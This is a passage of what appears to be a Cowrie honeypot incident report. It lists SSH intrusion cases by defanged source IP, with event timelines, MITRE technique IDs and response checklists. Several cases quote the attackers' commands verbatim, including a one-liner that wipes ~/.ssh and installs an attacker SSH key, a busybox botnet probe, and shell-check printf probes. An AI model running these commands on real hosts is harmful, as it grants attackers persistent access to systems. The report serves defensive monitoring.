| `2026-11-28 00:48:58` | `cowrie.login.success` |
| `2026-11-28 00:48:59` | `cowrie.session.params` |
| `2026-11-28 00:48:59` | `cowrie.command.input` |
| `2026-11-28 00:48:59` | `cowrie.log.closed` |
| `2026-11-28 00:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]47` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48f57954d1d9

| Field | Detail |
|---|---|
| **Source IP** | `183.23.62[.]202` |
| **First Seen** | 2026-11-28 00:55 |
| **Last Seen** | 2026-11-28 00:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:55:40` | `cowrie.session.connect` |
| `2026-11-28 00:55:40` | `cowrie.client.version` |
| `2026-11-28 00:55:41` | `cowrie.client.kex` |
| `2026-11-28 00:55:41` | `cowrie.login.success` |
| `2026-11-28 00:55:43` | `cowrie.session.params` |
| `2026-11-28 00:55:43` | `cowrie.command.input` |
| `2026-11-28 00:55:43` | `cowrie.command.failed` |
| `2026-11-28 00:55:43` | `cowrie.log.closed` |
| `2026-11-28 00:55:44` | `cowrie.session.params` |
| `2026-11-28 00:55:44` | `cowrie.command.input` |
| `2026-11-28 00:55:44` | `cowrie.session.file_download` |
| `2026-11-28 00:55:44` | `cowrie.log.closed` |
| `2026-11-28 00:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.23.62[.]202` to AbuseIPDB if not already reported
- [ ] Block `183.23.62[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a2030278c87

| Field | Detail |
|---|---|
| **Source IP** | `183.23.62[.]202` |
| **First Seen** | 2026-11-28 00:55 |
| **Last Seen** | 2026-11-28 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:55:44` | `cowrie.session.connect` |
| `2026-11-28 00:55:44` | `cowrie.client.version` |
| `2026-11-28 00:55:44` | `cowrie.client.kex` |
| `2026-11-28 00:55:45` | `cowrie.login.success` |
| `2026-11-28 00:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.23.62[.]202` to AbuseIPDB if not already reported
- [ ] Block `183.23.62[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62708848d2c1

| Field | Detail |
|---|---|
| **Source IP** | `165.154.22[.]180` |
| **First Seen** | 2026-11-28 01:18 |
| **Last Seen** | 2026-11-28 01:18 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 01:18:03` | `cowrie.session.connect` |
| `2026-11-28 01:18:04` | `cowrie.client.version` |
| `2026-11-28 01:18:04` | `cowrie.client.kex` |
| `2026-11-28 01:18:05` | `cowrie.login.success` |
| `2026-11-28 01:18:06` | `cowrie.session.params` |
| `2026-11-28 01:18:06` | `cowrie.command.input` |
| `2026-11-28 01:18:06` | `cowrie.command.failed` |
| `2026-11-28 01:18:07` | `cowrie.log.closed` |
| `2026-11-28 01:18:08` | `cowrie.session.params` |
| `2026-11-28 01:18:08` | `cowrie.command.input` |
| `2026-11-28 01:18:08` | `cowrie.session.file_download` |
| `2026-11-28 01:18:08` | `cowrie.log.closed` |
| `2026-11-28 01:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.22[.]180` to AbuseIPDB if not already reported
- [ ] Block `165.154.22[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04fead39b3d7

| Field | Detail |
|---|---|
| **Source IP** | `165.154.22[.]180` |
| **First Seen** | 2026-11-28 01:18 |
| **Last Seen** | 2026-11-28 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 01:18:09` | `cowrie.session.connect` |
| `2026-11-28 01:18:09` | `cowrie.client.version` |
| `2026-11-28 01:18:09` | `cowrie.client.kex` |
| `2026-11-28 01:18:10` | `cowrie.login.success` |
| `2026-11-28 01:18:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.22[.]180` to AbuseIPDB if not already reported
- [ ] Block `165.154.22[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2be3fbbdc04f

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-11-28 01:19 |
| **Last Seen** | 2026-11-28 01:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, linuxshell, system, sh, ls /home; /bin/busybox BOTNET` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 01:19:40` | `cowrie.session.connect` |
| `2026-11-28 01:19:41` | `cowrie.login.success` |
| `2026-11-28 01:19:41` | `cowrie.session.params` |
| `2026-11-28 01:19:41` | `cowrie.command.input` |
| `2026-11-28 01:19:41` | `cowrie.command.failed` |
| `2026-11-28 01:19:41` | `cowrie.command.input` |
| `2026-11-28 01:19:41` | `cowrie.command.failed` |
| `2026-11-28 01:19:42` | `cowrie.command.input` |
| `2026-11-28 01:19:42` | `cowrie.command.failed` |
| `2026-11-28 01:19:42` | `cowrie.command.input` |
| `2026-11-28 01:19:42` | `cowrie.command.input` |
| `2026-11-28 01:19:42` | `cowrie.command.input` |
| `2026-11-28 01:19:42` | `cowrie.log.closed` |
| `2026-11-28 01:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-420ffee8a519

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-11-28 01:20 |
| **Last Seen** | 2026-11-28 01:20 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8e67561ff8f16adee371b05144a18543_small_control'"'"' '"'"'check_8e67561ff8f16adee371b05144a18543'"'"'', printf '\n%s|%s\n' 'check_8e67561ff8f16adee371b05144a18543_small_control' 'check_8e67561ff8f16adee371b05144a18543', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8e67561ff8f16adee371b05144a18543_small_math'"'"' "$((564*246+81))"', (564*246+81, printf '\n%s|%s\n' 'check_8e67561ff8f16adee371b05144a18543_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 01:20:38` | `cowrie.session.connect` |
| `2026-11-28 01:20:39` | `cowrie.client.version` |
| `2026-11-28 01:20:39` | `cowrie.client.kex` |
| `2026-11-28 01:20:42` | `cowrie.login.success` |
| `2026-11-28 01:20:44` | `cowrie.client.size` |
| `2026-11-28 01:20:45` | `cowrie.session.params` |
| `2026-11-28 01:20:46` | `cowrie.command.input` |
| `2026-11-28 01:20:46` | `cowrie.command.input` |
| `2026-11-28 01:20:46` | `cowrie.command.input` |
| `2026-11-28 01:20:46` | `cowrie.command.input` |
| `2026-11-28 01:20:46` | `cowrie.command.input` |
| `2026-11-28 01:20:46` | `cowrie.command.input` |
| `2026-11-28 01:20:46` | `cowrie.command.input` |
| `2026-11-28 01:20:46` | `cowrie.command.input` |
| `2026-11-28 01:20:46` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6e1e60d09cb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-11-28 01:22 |
| **Last Seen** | 2026-11-28 01:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_eab6e046a31dc0ba347244cc70205df9_small_control'"'"' '"'"'check_eab6e046a31dc0ba347244cc70205df9'"'"'', printf '\n%s|%s\n' 'check_eab6e046a31dc0ba347244cc70205df9_small_control' 'check_eab6e046a31dc0ba347244cc70205df9', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_eab6e046a31dc0ba347244cc70205df9_small_math'"'"' "$((267*928+44))"', (267*928+44, printf '\n%s|%s\n' 'check_eab6e046a31dc0ba347244cc70205df9_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 01:22:56` | `cowrie.session.connect` |
| `2026-11-28 01:22:56` | `cowrie.client.version` |
| `2026-11-28 01:22:56` | `cowrie.client.kex` |
| `2026-11-28 01:22:57` | `cowrie.login.success` |
| `2026-11-28 01:23:01` | `cowrie.client.size` |
| `2026-11-28 01:23:01` | `cowrie.session.params` |
| `2026-11-28 01:23:02` | `cowrie.command.input` |
| `2026-11-28 01:23:02` | `cowrie.command.input` |
| `2026-11-28 01:23:02` | `cowrie.command.input` |
| `2026-11-28 01:23:02` | `cowrie.command.input` |
| `2026-11-28 01:23:02` | `cowrie.command.input` |
| `2026-11-28 01:23:02` | `cowrie.command.input` |
| `2026-11-28 01:23:02` | `cowrie.command.input` |
| `2026-11-28 01:23:02` | `cowrie.command.input` |
| `2026-11-28 01:23:02` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85f092788f68

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-11-28 01:25 |
| **Last Seen** | 2026-11-28 01:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a7c067b5a63c6a3eeb348f082f9757bb_small_control'"'"' '"'"'check_a7c067b5a63c6a3eeb348f082f9757bb'"'"'', printf '\n%s|%s\n' 'check_a7c067b5a63c6a3eeb348f082f9757bb_small_control' 'check_a7c067b5a63c6a3eeb348f082f9757bb', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a7c067b5a63c6a3eeb348f082f9757bb_small_math'"'"' "$((74*784+71))"', (74*784+71, printf '\n%s|%s\n' 'check_a7c067b5a63c6a3eeb348f082f9757bb_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 01:25:14` | `cowrie.session.connect` |
| `2026-11-28 01:25:14` | `cowrie.client.version` |
| `2026-11-28 01:25:14` | `cowrie.client.kex` |
| `2026-11-28 01:25:19` | `cowrie.login.success` |
| `2026-11-28 01:25:21` | `cowrie.client.size` |
| `2026-11-28 01:25:22` | `cowrie.session.params` |
| `2026-11-28 01:25:23` | `cowrie.command.input` |
| `2026-11-28 01:25:23` | `cowrie.command.input` |
| `2026-11-28 01:25:23` | `cowrie.command.input` |
| `2026-11-28 01:25:23` | `cowrie.command.input` |
| `2026-11-28 01:25:23` | `cowrie.command.input` |
| `2026-11-28 01:25:23` | `cowrie.command.input` |
| `2026-11-28 01:25:23` | `cowrie.command.input` |
| `2026-11-28 01:25:23` | `cowrie.command.input` |
| `2026-11-28 01:25:23` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a3d62786418

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-11-28 01:27 |
| **Last Seen** | 2026-11-28 01:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_279c73eac920a838afc534e4e1042614_small_control'"'"' '"'"'check_279c73eac920a838afc534e4e1042614'"'"'', printf '\n%s|%s\n' 'check_279c73eac920a838afc534e4e1042614_small_control' 'check_279c73eac920a838afc534e4e1042614', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_279c73eac920a838afc534e4e1042614_small_math'"'"' "$((171*936+53))"', (171*936+53, printf '\n%s|%s\n' 'check_279c73eac920a838afc534e4e1042614_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 01:27:31` | `cowrie.session.connect` |
| `2026-11-28 01:27:32` | `cowrie.client.version` |
| `2026-11-28 01:27:32` | `cowrie.client.kex` |
| `2026-11-28 01:27:35` | `cowrie.login.success` |
| `2026-11-28 01:27:37` | `cowrie.client.size` |
| `2026-11-28 01:27:37` | `cowrie.session.params` |
| `2026-11-28 01:27:38` | `cowrie.command.input` |
| `2026-11-28 01:27:38` | `cowrie.command.input` |
| `2026-11-28 01:27:38` | `cowrie.command.input` |
| `2026-11-28 01:27:38` | `cowrie.command.input` |
| `2026-11-28 01:27:38` | `cowrie.command.input` |
| `2026-11-28 01:27:38` | `cowrie.command.input` |
| `2026-11-28 01:27:38` | `cowrie.command.input` |
| `2026-11-28 01:27:38` | `cowrie.command.input` |
| `2026-11-28 01:27:38` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe51f306489e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-11-28 01:31 |
| **Last Seen** | 2026-11-28 01:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d848cef9ef60f386138b6c5c66979025_small_control'"'"' '"'"'check_d848cef9ef60f386138b6c5c66979025'"'"'', printf '\n%s|%s\n' 'check_d848cef9ef60f386138b6c5c66979025_small_control' 'check_d848cef9ef60f386138b6c5c66979025', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d848cef9ef60f386138b6c5c66979025_small_math'"'"' "$((534*463+79))"', (534*463+79, printf '\n%s|%s\n' 'check_d848cef9ef60f386138b6c5c66979025_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 01:31:46` | `cowrie.session.connect` |
| `2026-11-28 01:31:46` | `cowrie.client.version` |
| `2026-11-28 01:31:46` | `cowrie.client.kex` |
| `2026-11-28 01:31:50` | `cowrie.login.success` |
| `2026-11-28 01:31:52` | `cowrie.client.size` |
| `2026-11-28 01:31:53` | `cowrie.session.params` |
| `2026-11-28 01:31:54` | `cowrie.command.input` |
| `2026-11-28 01:31:54` | `cowrie.command.input` |
| `2026-11-28 01:31:54` | `cowrie.command.input` |
| `2026-11-28 01:31:54` | `cowrie.command.input` |
| `2026-11-28 01:31:54` | `cowrie.command.input` |
| `2026-11-28 01:31:54` | `cowrie.command.input` |
| `2026-11-28 01:31:54` | `cowrie.command.input` |
| `2026-11-28 01:31:54` | `cowrie.command.input` |
| `2026-11-28 01:31:54` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (58) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-4d0ed9a11f41 | HIGH | `193.32.162[.]84` | 2026-11-28 01:33 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-dc2f6df0781c | HIGH | `193.32.162[.]84` | 2026-11-28 01:36 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-672ab02fc1db | HIGH | `193.32.162[.]84` | 2026-11-28 01:38 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ce221008bf89 | HIGH | `193.32.162[.]84` | 2026-11-28 01:40 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-77ca4c3ed079 | HIGH | `114.35.59[.]237` | 2026-11-28 01:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-dba8934d2a8a | HIGH | `114.35.59[.]237` | 2026-11-28 01:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2125de76f94c | HIGH | `193.32.162[.]84` | 2026-11-28 01:42 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-cb2f14a0eefb | HIGH | `193.32.162[.]84` | 2026-11-28 01:44 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-52ef22abb6fb | HIGH | `193.32.162[.]84` | 2026-11-28 01:46 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3e019314e859 | HIGH | `45.121.25[.]115` | 2026-11-28 01:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6b9dfa92528a | HIGH | `45.121.25[.]115` | 2026-11-28 01:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a352de55f47c | HIGH | `193.32.162[.]84` | 2026-11-28 01:48 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-fa0513e97f42 | HIGH | `70.54.182[.]130` | 2026-11-28 01:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-596a7ee57b09 | HIGH | `70.54.182[.]130` | 2026-11-28 01:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6c49007e7cad | HIGH | `193.32.162[.]84` | 2026-11-28 01:50 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f345bc807e67 | HIGH | `193.32.162[.]84` | 2026-11-28 01:55 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d52cb56986d5 | HIGH | `193.32.162[.]84` | 2026-11-28 01:57 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-453db8c526f9 | HIGH | `201.77.124[.]248` | 2026-11-28 01:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-06c30ed2fc45 | HIGH | `201.77.124[.]248` | 2026-11-28 01:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9205f6232407 | HIGH | `103.189.208[.]13` | 2026-11-28 01:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ffc124832d16 | HIGH | `103.189.208[.]13` | 2026-11-28 01:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-52ed8b389794 | HIGH | `193.32.162[.]84` | 2026-11-28 01:59 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9bfec4b7ff89 | HIGH | `180.180.242[.]201` | 2026-11-28 01:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8e8a53cbc9ae | HIGH | `180.180.242[.]201` | 2026-11-28 01:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d896ac3c1691 | HIGH | `180.180.242[.]201` | 2026-11-28 02:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9827fb041ede | HIGH | `109.160.32[.]47` | 2026-11-28 02:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e1ef9ecf38f2 | HIGH | `163.52.135[.]28` | 2026-11-28 02:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-fcf819a18ad5 | HIGH | `193.32.162[.]84` | 2026-11-28 02:01 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-02d97342c089 | HIGH | `177.75.235[.]46` | 2026-11-28 02:02 | Y | 1 | 0 | `T1078 · T1592` |
| IR-f786d6a3caf3 | HIGH | `193.32.162[.]84` | 2026-11-28 02:03 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4a1f886242d8 | HIGH | `193.32.162[.]84` | 2026-11-28 02:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d93831cbbafd | HIGH | `43.103.49[.]116` | 2026-11-28 02:15 | Y | 1 | 0 | `T1078 · T1592` |
| IR-cdea8680c809 | HIGH | `77.239.124[.]16` | 2026-11-28 02:15 | Y | 0 | 0 | `T1078` |
| IR-a89db4b8bbb4 | HIGH | `77.239.124[.]16` | 2026-11-28 02:15 | Y | 181 | 0 | `T1078 · T1110.001` |
| IR-ee4beedbfda6 | HIGH | `119.96.158[.]238` | 2026-11-28 02:35 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-27db8f9e365e | HIGH | `78.128.112[.]74` | 2026-11-28 02:37 | Y | 1 | 0 | `T1078 · T1592` |
| IR-b3789b382deb | HIGH | `212.56.43[.]199` | 2026-11-28 02:56 | Y | 4 | 0 | `T1078 · T1083` |
| IR-7c9d2808c8a1 | HIGH | `35.210.39[.]217` | 2026-11-28 03:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2c34bd8eec7b | HIGH | `176.53.159[.]196` | 2026-11-28 03:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ca1d4a0baee2 | HIGH | `35.210.208[.]132` | 2026-11-28 03:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8d23b9335312 | HIGH | `35.210.132[.]194` | 2026-11-28 04:01 | Y | 3 | 0 | `T1078` |
| IR-529fec4804e6 | HIGH | `177.75.235[.]46` | 2026-11-28 04:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-358aea14e5f0 | HIGH | `179.176.210[.]17` | 2026-11-28 04:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1f981a598f1d | HIGH | `179.176.210[.]17` | 2026-11-28 04:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9d0cbb2935d3 | HIGH | `35.237.94[.]18` | 2026-11-28 04:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-25368f0574e7 | HIGH | `35.237.94[.]18` | 2026-11-28 04:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fe445b10add1 | HIGH | `138.124.124[.]212` | 2026-11-28 04:11 | Y | 4 | 0 | `T1078` |
| IR-c0e50a48c822 | HIGH | `163.52.135[.]28` | 2026-11-28 04:11 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ef06ed21c7a7 | HIGH | `35.210.13[.]57` | 2026-11-28 04:15 | Y | 3 | 0 | `T1078` |
| IR-77718689339b | HIGH | `194.164.107[.]4` | 2026-11-28 04:19 | Y | 3 | 0 | `T1078` |
| IR-9deb4f17a62f | HIGH | `138.124.124[.]210` | 2026-11-28 04:20 | Y | 4 | 0 | `T1078` |
| IR-9b28bddc4232 | HIGH | `138.124.116[.]194` | 2026-11-28 04:36 | Y | 0 | 0 | `T1078` |
| IR-4de7c8f817bd | HIGH | `191.37.76[.]156` | 2026-11-28 04:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-70e0d5e6fbbb | HIGH | `191.37.76[.]156` | 2026-11-28 04:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a446198e250b | HIGH | `180.76.228[.]149` | 2026-11-28 04:48 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-074bf8a53b7f | HIGH | `103.43.191[.]43` | 2026-11-28 04:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-28029b6f14d2 | HIGH | `103.43.191[.]43` | 2026-11-28 04:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-43a2558e95ca | HIGH | `177.75.235[.]46` | 2026-11-28 04:54 | Y | 0 | 0 | `T1078 · T1592` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `109.160.32[.]47` | **2** | 2026-11-28 00:47 | 2026-11-28 02:30 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `194.164.107[.]4` | **2** | 2026-11-28 03:48 | 2026-11-28 04:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.220.119[.]115` | 1 | 2026-11-28 00:01 | 2026-11-28 00:02 | 30s | 0 | `T1592` | 🟢 LOW |
| `119.109.205[.]4` | 1 | 2026-11-28 03:26 | 2026-11-28 03:26 | 13s | 0 | `T1592` | 🟢 LOW |
| `119.204.110[.]221` | 1 | 2026-11-28 02:57 | 2026-11-28 02:58 | 22s | 0 | `T1592` | 🟢 LOW |
| `121.150.234[.]205` | 1 | 2026-11-28 00:15 | 2026-11-28 00:15 | 20s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-28 03:13 | 2026-11-28 03:14 | 41s | 0 | `T1592` | 🟢 LOW |
| `138.99.196[.]73` | 1 | 2026-11-28 02:27 | 2026-11-28 02:28 | 13s | 0 | `T1592` | 🟢 LOW |
| `163.52.135[.]28` | 1 | 2026-11-28 00:35 | 2026-11-28 00:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `166.62.41[.]96` | 1 | 2026-11-28 04:50 | 2026-11-28 04:51 | 35s | 0 | `T1592` | 🟢 LOW |
| `167.250.28[.]185` | 1 | 2026-11-28 01:07 | 2026-11-28 01:08 | 33s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]202` | 1 | 2026-11-28 04:35 | 2026-11-28 04:35 | 0s | 0 | `T1592` | 🟢 LOW |
